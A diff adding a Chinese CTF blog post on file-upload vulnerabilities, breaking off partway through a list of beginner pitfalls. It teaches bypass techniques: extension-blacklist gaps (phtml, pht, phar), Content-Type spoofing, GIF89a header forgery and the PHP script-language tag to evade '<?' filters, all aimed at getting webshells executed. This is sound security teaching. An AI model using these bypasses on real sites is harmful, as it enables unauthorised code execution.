@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.css" integrity="sha256-mdaMxrItEW6hMIVJJNPKuX0B7KCSJQVEv3mVY4N2we4=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"quellisya.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.29.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="文件上传题的通用知识：漏洞从哪来、前端校验为什么不算防线、服务端会在哪些地方拦、哪些后缀可能被解析，外加 8 个新手常踩的坑和完整流程速查。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传基础：校验点、可执行后缀与常见坑">
+<meta property="og:url" content="https://quellisya.github.io/2026/10/24/web-knowledge-upload-basics/index.html">
+<meta property="og:site_name" content="Quellisya&#39;s Blog">
+<meta property="og:description" content="文件上传题的通用知识：漏洞从哪来、前端校验为什么不算防线、服务端会在哪些地方拦、哪些后缀可能被解析，外加 8 个新手常踩的坑和完整流程速查。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-10-24T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-28T12:30:00.000Z">
+<meta property="article:author" content="Quellisya">
+<meta property="article:tag" content=".htaccess">
+<meta property="article:tag" content="PHP 短标签">
+<meta property="article:tag" content="一句话木马">
+<meta property="article:tag" content="入门基础">
+<meta property="article:tag" content="后缀绕过">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="文件头伪造">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://quellisya.github.io/2026/10/24/web-knowledge-upload-basics/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://quellisya.github.io/2026/10/24/web-knowledge-upload-basics/","path":"/2026/10/24/web-knowledge-upload-basics/","title":"文件上传基础：校验点、可执行后缀与常见坑"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件上传基础：校验点、可执行后缀与常见坑 | Quellisya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/6.1.14/fancybox/fancybox.umd.js" integrity="sha256-QnJV4HT5r8i89ovZGRD86iynZqHerEbT2xt69vDM36I=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.1/pangu.umd.js" integrity="sha256-kRsxecBnwG6mULFPe2E6UKnNm8XfDOuDwCOprjLZuX8=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script><script src="/js/pjax.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js" defer></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","display_overflow":"scroll","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/4.1.3/tex-mml-chtml.js","integrity":"sha256-ihPtDDm7pTmSF9ViEsItlvsrBTsNkz0MOXMchzOwCQw="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Quellisya's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Quellisya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTF · Web Security · Writeups</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-rss"><a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%98%AF%E6%80%8E%E4%B9%88%E4%BA%A7%E7%94%9F%E7%9A%84"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞是怎么产生的</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E4%B8%8D%E6%98%AF%E9%98%B2%E7%BA%BF"><span class="nav-number">2.</span> <span class="nav-text">前端校验不是防线</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%AF%E8%83%BD%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%9C%B0%E6%96%B9%E6%8B%A6"><span class="nav-number">3.</span> <span class="nav-text">服务端可能在哪些地方拦</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%90%8E%E7%BC%80"><span class="nav-number">4.</span> <span class="nav-text">常见可执行后缀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-%E7%9A%84%E5%87%A0%E7%A7%8D%E2%80%9C%E5%BC%80%E6%A0%87%E7%AD%BE%E2%80%9D"><span class="nav-number">5.</span> <span class="nav-text">PHP 的几种“开标签”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91"><span class="nav-number">6.</span> <span class="nav-text">我踩过的坑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-1%EF%BC%9A%E6%8A%8A%E6%9C%A8%E9%A9%AC%E6%94%B9%E5%90%8D%E6%88%90-jpg-%E5%8E%BB%E9%AA%97%E5%89%8D%E7%AB%AF"><span class="nav-number">6.1.</span> <span class="nav-text">坑 1：把木马改名成 .jpg 去骗前端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-2%EF%BC%9A%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A0%B9%E6%9C%AC%E4%B8%8D%E6%98%AF%E6%9C%A8%E9%A9%AC"><span class="nav-number">6.2.</span> <span class="nav-text">坑 2：上传的文件内容根本不是木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-3%EF%BC%9Aeval-%E6%89%A7%E8%A1%8C%E7%9A%84%E6%98%AF-PHP%EF%BC%8C%E4%B8%8D%E6%98%AF%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="nav-number">6.3.</span> <span class="nav-text">坑 3：eval 执行的是 PHP，不是系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-4%EF%BC%9A%E5%8F%98%E9%87%8F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%92%8C-system-%E6%B7%B7%E7%94%A8"><span class="nav-number">6.4.</span> <span class="nav-text">坑 4：变量函数调用和 system(...) 混用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-5%EF%BC%9AURL-%E9%87%8C%E7%9A%84%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%B2%A1%E7%BC%96%E7%A0%81"><span class="nav-number">6.5.</span> <span class="nav-text">坑 5：URL 里的特殊字符没编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-6%EF%BC%9A%E6%8A%8A%E2%80%9C%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%E2%80%9D%E5%BD%93%E6%88%90%E2%80%9C%E6%9C%A8%E9%A9%AC%E5%8F%AF%E7%94%A8%E2%80%9D"><span class="nav-number">6.6.</span> <span class="nav-text">坑 6：把“上传成功”当成“木马可用”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-7%EF%BC%9A%E5%90%8E%E7%BC%80%E6%8B%BC%E9%94%99%EF%BC%8C%E4%B8%8A%E4%BC%A0%E2%80%9C%E6%88%90%E5%8A%9F%E2%80%9D%E5%8D%B4%E6%B0%B8%E8%BF%9C%E4%B8%8D%E8%A7%A3%E6%9E%90"><span class="nav-number">6.7.</span> <span class="nav-text">坑 7：后缀拼错，上传“成功”却永远不解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-8%EF%BC%9A%E5%8F%AA%E7%9C%8B%E5%88%B0-GIF89a%EF%BC%8C%E5%88%A4%E6%96%AD%E4%B8%8D%E4%BA%86%E5%88%B0%E5%BA%95%E6%89%A7%E8%A1%8C%E6%B2%A1%E6%89%A7%E8%A1%8C"><span class="nav-number">6.8.</span> <span class="nav-text">坑 8：只看到 GIF89a，判断不了到底执行没执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="nav-number">7.</span> <span class="nav-text">完整流程速查表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E6%89%8B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="nav-number">8.</span> <span class="nav-text">新手常见问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%BA%E6%89%8B%E8%81%8A%E8%81%8A%E6%80%8E%E4%B9%88%E9%98%B2"><span class="nav-number">9.</span> <span class="nav-text">顺手聊聊怎么防</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Quellisya</p>
+  <div class="site-description" itemprop="description">记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://quellisya.github.io/2026/10/24/web-knowledge-upload-basics/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Quellisya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Quellisya's Blog">
+      <meta itemprop="description" content="记录 CTF、Web 安全的学习笔记与 Writeup，尽量把每一步讲清楚。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件上传基础：校验点、可执行后缀与常见坑 | Quellisya's Blog">
+      <meta itemprop="description" content="文件上传题的通用知识：漏洞从哪来、前端校验为什么不算防线、服务端会在哪些地方拦、哪些后缀可能被解析，外加 8 个新手常踩的坑和完整流程速查。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传基础：校验点、可执行后缀与常见坑
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-24 10:00:00" itemprop="dateCreated datePublished" datetime="2026-10-24T10:00:00+08:00">2026-10-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-10-28 20:30:00" itemprop="dateModified" datetime="2026-10-28T20:30:00+08:00">2026-10-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/web/file-upload/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">文件上传题的通用知识：漏洞从哪来、前端校验为什么不算防线、服务端会在哪些地方拦、哪些后缀可能被解析，外加 8 个新手常踩的坑和完整流程速查。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+<nav class="series-nav">
+  <div class="series-nav__head">
+    <i class="fa fa-layer-group"></i>
+    <span class="series-nav__name">系列：文件上传</span>
+    <span class="series-nav__count">第 1 / 3 篇</span>
+  </div>
+  <ol class="series-nav__list"><li class="is-current"><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-knowledge-upload-basics&#x2F;">文件上传基础：校验点、可执行后缀与常见坑</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-actf2020&#x2F;">[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml</a></li><li><a href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-geek2019&#x2F;">[极客大挑战 2019] Upload：GIF89a 与 PHP 短标签绕过</a></li></ol>
+  <div class="series-nav__links"><a class="series-nav__next" href="&#x2F;2026&#x2F;10&#x2F;24&#x2F;web-ctf-upload-actf2020&#x2F;">[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml<i class="fa fa-arrow-right"></i></a></div>
+</nav><div class="note primary"><p><strong>本主题速览</strong></p>
+<ul>
+<li><strong>难度</strong>：入门</li>
+<li><strong>题目</strong>：[ACTF2020 新生赛]Upload（<a href="/2026/10/24/web-ctf-upload-actf2020/">第一篇</a>）、[极客大挑战 2019]Upload（<a href="/2026/10/24/web-ctf-upload-geek2019/">第二篇</a>）</li>
+<li><strong>考点</strong>：前端校验绕过、后缀黑名单、<code>Content-Type</code> &#x2F; 文件头校验、内容黑名单、<code>.htaccess</code> 解析映射</li>
+<li><strong>第一篇关键</strong>：黑名单漏了 <code>.phtml</code>，而服务器恰好把 <code>.phtml</code> 交给 PHP 解析</li>
+<li><strong>第二篇关键</strong>：内容黑名单只拦 <code>&lt;?</code>，改用 PHP 5 的 <code>&lt;script language=&quot;php&quot;&gt;</code> 标签就绕过了</li>
+<li><strong>一句话思路</strong>：让请求里的 <code>filename</code> 保持可执行后缀，再访问它确认真的执行</li>
+</ul>
+</div>
+
+<div class="note info"><p><strong>阅读说明</strong></p>
+<ul>
+<li><strong>前置知识</strong>：HTTP 请求基础、HTML 表单、浏览器开发者工具（F12）</li>
+<li><strong>环境</strong>：CTF 靶场。文中靶场地址是当时的临时环境，现在多半已失效，请换成自己的靶场或本地环境（如 upload-labs）。</li>
+<li>本文所有测试仅用于<strong>授权靶场和教学</strong>，请勿对未授权的站点进行任何测试。</li>
+</ul>
+</div>
+
+<div class="note default"><p><strong>做题路线</strong></p>
+<p><code>看前端</code> → <code>绕前端</code> → <code>摸后端黑名单</code> → <code>判断能否解析</code> → <code>传马</code> → <code>定位路径</code> → <code>执行命令</code></p>
+</div>
+
+<h2 id="文件上传漏洞是怎么产生的"><a href="#文件上传漏洞是怎么产生的" class="headerlink" title="文件上传漏洞是怎么产生的"></a>文件上传漏洞是怎么产生的</h2><p>一句话：<strong>上传点把用户上传的文件，当成了服务器可执行的代码。</strong></p>
+<p>正常的图片上传，文件存进去之后只是被 <code>img</code> 标签读出来显示；但如果上传目录里的文件会被 PHP 之类的解释器执行，攻击者传一个脚本上去，再访问它，就拿到了代码执行权限（RCE）。</p>
+<table>
+<thead>
+<tr>
+<th>上传的文件</th>
+<th>服务端怎么处理</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>一张图片</td>
+<td>当静态文件读取、返回</td>
+<td>正常</td>
+</tr>
+<tr>
+<td>一个 <code>.php</code> 脚本</td>
+<td>交给 PHP 解释器执行</td>
+<td><strong>RCE</strong></td>
+</tr>
+<tr>
+<td>一个 <code>.phtml</code> 脚本</td>
+<td>取决于服务器配置</td>
+<td>可能执行，也可能不执行</td>
+</tr>
+</tbody></table>
+<p>所以文件上传题的核心永远是同一个问题：</p>
+<blockquote>
+<p><strong>我能不能让服务端把一个“可执行后缀”的文件存下来，并且它真的会被解析？</strong></p>
+</blockquote>
+<h2 id="前端校验不是防线"><a href="#前端校验不是防线" class="headerlink" title="前端校验不是防线"></a>前端校验不是防线</h2><p>很多上传点会在浏览器里用 JavaScript 检查后缀，比如本题的 <code>checkFile()</code>。它确实能挡住普通用户，但<strong>这段代码运行在攻击者的浏览器里</strong>。</p>
+<table>
+<thead>
+<tr>
+<th>校验位置</th>
+<th>谁说了算</th>
+<th>能挡住攻击者吗</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>浏览器里的 JS</td>
+<td>攻击者自己</td>
+<td>❌ 可以关掉、覆盖，或直接发包</td>
+</tr>
+<tr>
+<td>服务端</td>
+<td>服务端</td>
+<td>✅ 这才是真防线</td>
+</tr>
+</tbody></table>
+<p>攻击者完全可以：</p>
+<ul>
+<li>关掉 JS；</li>
+<li>覆盖掉那个函数；</li>
+<li>根本不用浏览器，直接发 HTTP 请求。</li>
+</ul>
+<p>判断一个校验是不是“真防线”，标准只有一个：<strong>绕过浏览器之后，服务端还拦不拦。</strong></p>
+<h2 id="服务端可能在哪些地方拦"><a href="#服务端可能在哪些地方拦" class="headerlink" title="服务端可能在哪些地方拦"></a>服务端可能在哪些地方拦</h2><table>
+<thead>
+<tr>
+<th>检查点</th>
+<th>典型做法</th>
+<th>绕过思路</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>后缀</td>
+<td>黑名单 &#x2F; 白名单</td>
+<td>黑名单找遗漏（<code>phtml</code>、<code>pht</code>、<code>phar</code>、大小写等）；白名单要靠解析漏洞或配置</td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>只允许 <code>image/*</code></td>
+<td>请求头是客户端说了算，改成 <code>image/jpeg</code> 即可</td>
+</tr>
+<tr>
+<td>文件内容</td>
+<td><code>getimagesize()</code>、magic bytes</td>
+<td>在 payload 前面加 <code>GIF89a</code> 等文件头</td>
+</tr>
+<tr>
+<td>文件名</td>
+<td>随机重命名</td>
+<td>一般绕不过，但要看它是否<strong>保留后缀</strong></td>
+</tr>
+<tr>
+<td>执行权限</td>
+<td>上传目录禁止执行脚本</td>
+<td>这是最有效的防御，一旦做对，传什么都白搭</td>
+</tr>
+</tbody></table>
+<div class="note warning"><p>本题只做了<strong>后缀黑名单</strong>这一层，而且漏了 <code>phtml</code>。先记住这个结论，后面会一步步验证。</p>
+</div>
+
+<h2 id="常见可执行后缀"><a href="#常见可执行后缀" class="headerlink" title="常见可执行后缀"></a>常见可执行后缀</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  php3  php4  php5  php7  phtml  pht  phar  pgif  inc</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>phtml</code>、<code>pht</code> 能不能执行，<strong>完全取决于 Web 服务器的配置</strong>。记住这句话，后面会用到。</p>
+<h2 id="PHP-的几种“开标签”"><a href="#PHP-的几种“开标签”" class="headerlink" title="PHP 的几种“开标签”"></a>PHP 的几种“开标签”</h2><p>上传题的过滤，很多时候盯的就是“文件里有没有 <code>&lt;?</code>”。所以要知道 PHP 还有哪些等价写法：</p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>说明</th>
+<th>PHP 7</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&lt;?php ... ?&gt;</code></td>
+<td>标准标签，最常用</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>&lt;? ... ?&gt;</code></td>
+<td>短标签，需要 <code>short_open_tag</code> 打开</td>
+<td>取决于配置</td>
+</tr>
+<tr>
+<td><code>&lt;?= ... ?&gt;</code></td>
+<td>短输出标签，等价于 <code>&lt;?php echo ... ?&gt;</code></td>
+<td>✅</td>
+</tr>
+<tr>
+<td><code>&lt;script language=&quot;php&quot;&gt; ... &lt;/script&gt;</code></td>
+<td>PHP 5 专用，7.0 起移除</td>
+<td>❌</td>
+</tr>
+</tbody></table>
+<p>最后一种在 PHP 5 时代很常见，<strong>它一个 <code>&lt;?</code> 都不含</strong>。碰上“只拦 <code>&lt;?</code>”的内容黑名单，这就是现成的绕过写法，第二篇会用到。</p>
+<h2 id="我踩过的坑"><a href="#我踩过的坑" class="headerlink" title="我踩过的坑"></a>我踩过的坑</h2><p>这一章是真实过程，不是事后润色。每个坑都附上现象和正确做法，方便对照排查。</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>坑</th>
+<th>一句话解法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>把木马改名成 <code>.jpg</code> 去骗前端</td>
+<td>改请求里的 <code>filename</code>，不改文件</td>
+</tr>
+<tr>
+<td>2</td>
+<td>上传的文件内容根本不是木马</td>
+<td>上传前打开看一眼</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>eval</code> 里塞系统命令</td>
+<td>执行命令用 <code>system()</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>变量函数和 <code>system()</code> 混用</td>
+<td>两种风格别混</td>
+</tr>
+<tr>
+<td>5</td>
+<td>URL 里的特殊字符没编码</td>
+<td>空格写 <code>%20</code>，或改用 POST</td>
+</tr>
+<tr>
+<td>6</td>
+<td>把“上传成功”当成“木马可用”</td>
+<td>按四步逐层验证</td>
+</tr>
+<tr>
+<td>7</td>
+<td>后缀拼成 <code>phmtl</code>，上传“成功”但不解析</td>
+<td>核对拼写，<code>phtml</code> 不是 <code>phmtl</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>页面只剩 <code>GIF89a</code>，判断不了执行没执行</td>
+<td>带参数发一次请求验证</td>
+</tr>
+</tbody></table>
+<h3 id="坑-1：把木马改名成-jpg-去骗前端"><a href="#坑-1：把木马改名成-jpg-去骗前端" class="headerlink" title="坑 1：把木马改名成 .jpg 去骗前端"></a>坑 1：把木马改名成 <code>.jpg</code> 去骗前端</h3><mark class="label danger">现象</mark> 本地把 `x.jpg` 传上去，提示 `Upload Success`，但访问 `upload/3e602dd0....jpg` 什么也不执行。
+
+<mark class="label warning">原因</mark> 前端校验看的是浏览器里的文件名，但**服务端保存时用的是请求里的 `filename` 字段**。你把文件真名改成 `.jpg`，等于把 `filename` 也改成了 `x.jpg`，服务端老老实实存成图片后缀。而且这个文件名的 md5 一算就是回显里的名字：
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(&quot;x.jpg&quot;) = 3e602dd0ab83a3a8c3f32309bb9a88f9</span><br></pre></td></tr></table></figure>
+
+<mark class="label success">正确做法</mark> 文件名保持 `.phtml`，用 1.3 的方法让前端 JS 不执行。**改的是请求，不是文件。**
+
+<h3 id="坑-2：上传的文件内容根本不是木马"><a href="#坑-2：上传的文件内容根本不是木马" class="headerlink" title="坑 2：上传的文件内容根本不是木马"></a>坑 2：上传的文件内容根本不是木马</h3><mark class="label danger">现象</mark> 访问上传后的 `.phtml`，浏览器显示的是一个绿色的 "Upload Page" 页面，还带着 `Saved to: upload/xxx.jpg` 的字样。
+
+<mark class="label warning">原因</mark> 那个 `.phtml` 文件的内容就是一整页 HTML——大概率是把某个上传练习页面“另存为”成了 `js_webshell.phtml`，然后选错文件上传了。服务端把 HTML 原样返回，浏览器就把它渲染出来了。
+
+<p>用哈希也能确认没传错文件：</p>
